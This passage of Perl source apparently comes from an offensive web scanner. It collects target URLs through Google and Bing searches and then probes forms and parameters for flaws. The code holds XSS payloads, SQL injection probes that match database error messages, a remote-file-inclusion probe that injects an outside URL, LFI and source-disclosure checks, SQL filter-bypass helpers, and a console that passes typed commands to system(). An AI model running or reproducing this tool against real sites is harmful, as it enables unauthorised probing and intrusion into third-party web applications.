                    $controlt = 1;
                    $count++;
                    printear(
                        "[+] Link : " . $fage . "/" . $path . "\n", "text",
                        "11",                                       "5"
                    );
                    savefile( "admin-logs.txt", $fage . "/" . $path );
                }
            }
        }

    }

    sub http {

        my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );

        my $socket = IO::Socket::INET->new(
            PeerAddr => $auth,
            PeerPort => "80",
            Proto    => "tcp"
        );

        print $socket "OPTIONS  / HTTP/1.0\r\n\r\n";
        read $socket, $resultado, "1000";

        if ( $resultado =~ /Server:(.*)/g ) {
            my $server = $1;

            printear( "\n[+] Page : $auth" . "\n",      "text", "11", "5" );
            printear( "[+] Server : " . $server . "\n", "text", "11", "5" );

            savefile( "http-logs.txt", "[+] Page : $auth" . "\n" );
            savefile( "http-logs.txt", "[+] Server : " . $server . "\n" );
        }
        if ( $resultado =~ /Allow: (.*)/g ) {
            my $options = $1;

            printear( "[+] Options : " . $options . "\n", "text", "11", "5" );
            savefile( "http-logs.txt", "[+] Options : " . $options . "\n" );

        }
        $socket->close;
    }

    sub scanxss {

        my $page = shift;
        chomp $page;

        my @testar = HTML::Form->parse( toma($page), "/" );
        my @botones_names;
        my @botones_values;
        my @orden;
        my @pa = (
"<script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>",
'"><script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>'
        );
        my @get_founds;
        my @post_founds;
        my @ordenuno;
        my @ordendos;

        my $contador_forms = 0;

        my $valor = "doddyhackman";

        for my $test (@testar) {
            $contador_forms++;
            if ( $test->method eq "POST" ) {
                my @inputs = $test->inputs;
                for my $in (@inputs) {
                    if ( $in->type eq "submit" ) {
                        if ( $in->name eq "" ) {
                            push( @botones_names, "submit" );
                        }
                        push( @botones_names,  $in->name );
                        push( @botones_values, $in->value );
                    }
                    else {
                        push( @ordenuno, $in->name, $pa[0] );
                        push( @ordendos, $in->name, $pa[1] );
                    }
                }

                for my $n ( 0 .. int(@botones_names) - 1 ) {
                    my @preuno = @ordenuno;
                    my @predos = @ordendos;
                    push( @preuno, $botones_names[$n], $botones_values[$n] );
                    push( @predos, $botones_names[$n], $botones_values[$n] );

                    my $codeuno = $nave->post( $page, \@preuno )->content;
                    my $codedos = $nave->post( $page, \@predos )->content;
                    if ( $codeuno =~
/<script>alert\(String.fromCharCode\(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111\)\)<\/script>/ig
                        or $codedos =~
/<script>alert\(String.fromCharCode\(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111\)\)<\/script>/ig
                      )
                    {
                        if (   $test->attr(name) eq ""
                            or $test->attr(name) eq " " )
                        {
                            push( @post_founds, $contador_forms );
                        }
                        else {
                            push( @post_founds, $test->attr(name) );
                        }
                    }
                }
            }
            else {    #Fin de metodo POST
                my @inputs = $test->inputs;
                for my $in (@inputs) {
                    if ( $in->type eq "submit" ) {
                        if ( $in->name eq "" ) {
                            push( @botones_names, "submit" );
                        }
                        push( @botones_names,  $in->name );
                        push( @botones_values, $in->value );
                    }
                    else {
                        $orden .= '' . $in->name . '=' . $valor . '&';
                    }
                }
                chop($orden);
                for my $n ( 0 .. int(@botones_names) - 1 ) {
                    my $partedos =
                      "&" . $botones_names[$n] . "=" . $botones_values[$n];
                    my $final = $orden . $partedos;
                    for my $strin (@pa) {
                        chomp $strin;
                        $final =~ s/doddyhackman/$strin/;
                        $code = toma( $page . "?" . $final );
                        my $strin = "\Q$strin\E";
                        if ( $code =~ /$strin/ ) {
                            push( @get_founds, $page . "?" . $final );
                        }
                    }
                }
            }
        }

        my @get_founds = repes(@get_founds);
        if ( int(@get_founds) ne 0 ) {
            for (@get_founds) {
                savefile( "xss-logs.txt", "[+] XSS Found : $_" );
                printear( "[+] XSS Found : $_\n\a", "text", "11", "5" );
            }
        }

        my @post_founds = repes(@post_founds);
        if ( int(@post_founds) ne 0 ) {
            for my $t (@post_founds) {
                if ( $t =~ /^\d+$/ ) {
                    savefile( "xss-logs.txt", "[+] XSS : Form $t in $page" );
                    printear( "[+] XSS : Form $t in $page\n\a",
                        "text", "11", "5" );
                }
            }
        }
    }

    sub simple {

        my $code  = toma( $_[0] );
        my @links = get_links($code);

        for my $com (@links) {
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
            if ( $path =~ /\/(.*)$/ ) {
                my $path1 = $1;
                $_[0] =~ s/$path1//ig;
                my ( $scheme, $auth, $path, $query, $frag ) = uri_split($com);
                if ( $path =~ /(.*)\// ) {
                    my $parche = $1;
                    unless ( $repetidos =~ /$parche/ ) {
                        $repetidos .= " " . $parche;
                        my $code = toma( "http://" . $auth . $parche );
                        if ( $code =~ /Index of (.*)</ig ) {
                            my $dir_found = $1;
                            chomp $dir_found;
                            printear(
                                "[+] Directory Found : "
                                  . "http://"
                                  . $auth
                                  . $parche . "\n",
                                "text", "11", "5"
                            );
                            savefile( "dir-logs.txt",
                                    "[+] Directory Found : "
                                  . "http://"
                                  . $auth
                                  . $parche );
                        }
                    }
                }
            }
        }
    }

    sub scansql {

        my $page  = shift;
        my $copia = $page;

        $co = toma( $page . "'" );

        if ( $co =~
/supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig
            || $co =~ /mysql_free_result/ig
            || $co =~ /mysql_fetch_assoc/ig
            || $co =~ /mysql_num_rows/ig
            || $co =~ /mysql_fetch_array/ig
            || $co =~ /mysql_fetch_assoc/ig
            || $co =~ /mysql_query/ig
            || $co =~ /mysql_free_result/ig
            || $co =~ /equivocado en su sintax/ig
            || $co =~ /You have an error in your SQL syntax/ig
            || $co =~ /Call to undefined function/ig )
        {
            savefile( "sql-logs.txt", "[+] SQL : $page" );
            printear( "[+] SQLI : $page\a\n", "text", "11", "5" );
        }
        else {

            if ( $page =~ /(.*)\?(.*)/ ) {
                my $page = $1;

                my @testar = HTML::Form->parse( toma($page), "/" );
                my @botones_names;
                my @botones_values;
                my @orden;
                my @get_founds;
                my @post_founds;
                my @ordenuno;
                my @ordendos;

                my $contador_forms = 0;

                my $valor = "doddyhackman";

                for my $test (@testar) {
                    $contador_forms++;
                    if ( $test->method eq "POST" ) {
                        my @inputs = $test->inputs;
                        for my $in (@inputs) {
                            if ( $in->type eq "submit" ) {
                                if ( $in->name eq "" ) {
                                    push( @botones_names, "submit" );
                                }
                                push( @botones_names,  $in->name );
                                push( @botones_values, $in->value );
                            }
                            else {
                                push( @ordenuno, $in->name, "'" );
                            }
                        }

                        for my $n ( 0 .. int(@botones_names) - 1 ) {
                            my @preuno = @ordenuno;
                            push( @preuno,
                                $botones_names[$n], $botones_values[$n] );
                            my $code = $nave->post( $page, \@preuno )->content;
                            if ( $code =~
/supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig
                                || $code =~ /mysql_free_result/ig
                                || $code =~ /mysql_fetch_assoc/ig
                                || $code =~ /mysql_num_rows/ig
                                || $code =~ /mysql_fetch_array/ig
                                || $code =~ /mysql_fetch_assoc/ig
                                || $code =~ /mysql_query/ig
                                || $code =~ /mysql_free_result/ig
                                || $code =~ /equivocado en su sintax/ig
                                || $code =~
                                /You have an error in your SQL syntax/ig
                                || $code =~ /Call to undefined function/ig )
                            {
                                if (   $test->attr(name) eq ""
                                    or $test->attr(name) eq " " )
                                {
                                    push( @post_founds, $contador_forms );
                                }
                                else {
                                    push( @post_founds, $test->attr(name) );
                                }
                            }
                        }
                    }

                    my @post_founds = repes(@post_founds);
                    if ( int(@post_founds) ne 0 ) {
                        for my $t (@post_founds) {
                            if ( $t =~ /^\d+$/ ) {
                                savefile( "sql-logs.txt",
                                    "[+] SQLI : Form $t in $page" );
                                printear(
                                    "[+] SQLI : Form $t in $page\n\a", "text",
                                    "11",                              "5"
                                );
                            }
                        }
                    }
                }
            }
        }
    }

    sub access {

        my $page = shift;
        $code1 = toma( $page . "'" );
        if (   $code1 =~ /Microsoft JET Database/ig
            or $code1 =~ /ODBC Microsoft Access Driver/ig )
        {
            printear( "[+] Jet DB : $page\a\n", "text", "11", "5" );
            savefile( "jetdb-logs.txt", $page );
        }
    }

    sub mssql {

        my $page = shift;
        $code1 = toma( $page . "'" );
        if ( $code1 =~ /ODBC SQL Server Driver/ig ) {
            printear( "[+] MSSQL : $page\a\n", "text", "11", "5" );
            savefile( "mssql-logs.txt", $page );
        }
    }

    sub oracle {

        my $page = shift;
        $code1 = toma( $page . "'" );
        if ( $code1 =~ /Microsoft OLE DB Provider for Oracle/ig ) {
            printear( "[+] Oracle : $page\a\n", "text", "11", "5" );
            savefile( "oracle-logs.txt", $page );
        }
    }

    sub rfi {
        my $page = shift;
        $code1 = toma( $page . "http:/www.supertangas.com/" );
        if ( $code1 =~ /Los mejores TANGAS de la red/ig )
        {    #Esto es conocimiento de verdad xDDD
            printear( "[+] RFI : $page\a\n", "text", "11", "5" );
            savefile( "rfi-logs.txt", $page );
        }
    }

    sub lfi {
        my $page = shift;
        $code1 = toma( $page . "'" );
        if ( $code1 =~ /No such file or directory in <b>(.*)<\/b> on line/ig ) {
            printear( "[+] LFI : $page\a\n", "text", "11", "5" );
            savefile( "lfi-logs.txt", $page );
        }
    }

    sub fsd {
        my $page = shift;
        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);
        if ( $path =~ /\/(.*)$/ ) {
            my $me = $1;
            $code1 = toma( $page . $me );
            if ( $code1 =~ /header\((.*)Content-Disposition: attachment;/ig ) {
                printear(
                    "[+] Full Source Discloure : $page\a\n", "text",
                    "11",                                    "5"
                );
                savefile( "fpd-logs.txt", $page );
            }
        }
    }

    sub men {
        printear( "\n\n[+] Scan Type : \n\n", "text", "5", "5" );
        printear( "
[X] : XSS
[S] : SQL GET/POST
[K] : SQL GET
[Q] : SQL GET + Admin
[Y] : Directory listing
[M] : MSSQL
[J] : Jet Database
[O] : Oracle
[L] : LFI
[R] : RFI
[F] : Full Source Discloure
[HT] : HTTP Information
[A] : All
", "text", "13", "5" );
        my $option = printear( "\n[Options] : ", "stdin", "11", "13" );
        return $option;
    }

    sub finish_now {
        printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
        <stdin>;
        estoydentro();
    }

    sub bing {

        my ( $a, $b ) = @_;
        for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
            my $code =
              toma( "http://www.bing.com/search?q=" . $a . "&first=" . $pages );

            while ( $code =~ /<h3><a href="(.*?)"/mig ) {
                push( @founds, $1 );
            }
        }
        my @founds = repes( cortar(@founds) );
        return @founds;
    }

    sub google {
        my ( $a, $b ) = @_;
        my @founds;
        for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
            $code =
              toma( "http://www.google.com.ar/search?hl=&q=" 
                  . $a
                  . "&start=$pages" );
            while ( $code =~ /(?<="r"><. href=")(.+?)"/mig ) {
                my $url = $1;
                if ( $url =~ /\/url\?q\=(.*?)\&amp\;/ ) {
                    push( @founds, uri_unescape($1) );
                }
            }
        }
        my @founds = repes( cortar(@founds) );
        return @founds;
    }

}    ##

sub load_cmd {

    head_console();

    sub head_console {
        clean();
        printear( "


  @@@@   @@@@   @    @   @@@    @@@@   @     @@@@@
 @    @ @    @  @@   @  @   @  @    @  @     @    
 @      @    @  @@   @  @      @    @  @     @    
 @      @    @  @ @  @  @      @    @  @     @    
 @      @    @  @ @  @   @@@   @    @  @     @@@@ 
 @      @    @  @  @ @      @  @    @  @     @    
 @      @    @  @   @@      @  @    @  @     @    
 @    @ @    @  @   @@  @   @  @    @  @     @    
  @@@@   @@@@   @    @   @@@    @@@@   @@@@@ @@@@@



", "text", "7", "5" );
    }

    while (1) {
        my $cmd = printear( "\n\n[+] Command : ", "stdin", "11", "13" );
        print "\n\n";
        if ( $cmd eq "exit" ) {
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }
        else {
            my $data = getdatanownownownow();
            if ( $data =~ /colors=n/ ) {
                system($cmd);
            }
            else {
                cprint "\x037";
                system($cmd);
                cprint "\x030";
            }
        }
    }

}    ##

##

##Funciones secundarias ###

sub toma {
    return $nave->get( $_[0] )->content;
}

sub tomados {
    return $nave->get( $_[0] );
}

sub tomar {
    my ( $web, $var ) = @_;
    return $nave->post( $web, [ %{$var} ] )->content;
}

sub ver_length {
    return true if length( $_[0] ) == 32;
}

sub savefile {
    open( SAVE, ">>logs/" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub get_links {

    $test = HTML::LinkExtor->new( \&agarrar )->parse( $_[0] );
    return @links;

    sub agarrar {
        my ( $a, %b ) = @_;
        push( @links, values %b );
    }
}

sub savefilear {
    open( SAVE, ">>logs/webs/" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub partimealmedio {
    my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
    my $save = $auth;
    $save =~ s/:/_/;
    return $save;
}

sub encode {
    my $string = $_[0];
    $hex = '0x';
    for ( split //, $string ) {
        $hex .= sprintf "%x", ord;
    }
    return $hex;
}

sub decode {
    $_[0] =~ s/^0x//;
    $encode = join q[], map { chr hex } $_[0] =~ /../g;
    return $encode;
}

sub bypass {
    if    ( $_[0] eq "/*" )  { return ( "/**/", "/**/" ); }
    elsif ( $_[0] eq "%20" ) { return ( "%20",  "%00" ); }
    else                     { return ( "+",    "--" ); }
}

sub ascii {
    return join ',', unpack "U*", $_[0];
}

sub ascii_de {
    $_[0] = join q[], map { chr } split q[,], $_[0];
    return $_[0];
}

sub installer_kobra {
    unless ( -d "/logs/webs" ) {
        mkdir( "logs/",      777 );
        mkdir( "logs/webs/", 777 );
    }
}

sub cortar {
    my @nuevo;
    for (@_) {
        if ( $_ =~ /=/ ) {
            @tengo = split( "=", $_ );
            push( @nuevo, @tengo[0] . "=" );
        }
        else {
            push( @nuevo, $_ );
        }
    }
    return @nuevo;
}

sub installer_par {
    unless ( -d "logs/" ) {
        mkdir( "logs/", "777" );
    }
}

sub repes {
    my @limpio;
    foreach $test (@_) {
        push @limpio, $test unless $repe{$test}++;
    }
    return @limpio;
}

sub savewords {
    open( FILE, $_[0] );
    @words = <FILE>;
    close FILE;
    for (@words) {
        push( @r, $_ );
    }
    return (@r);
}

sub getdatanownownownow {
    open my $FILE, q[<], "data.txt";
    my $word = join q[], <$FILE>;
    close $FILE;
    return $word;
}

##

#The End ?
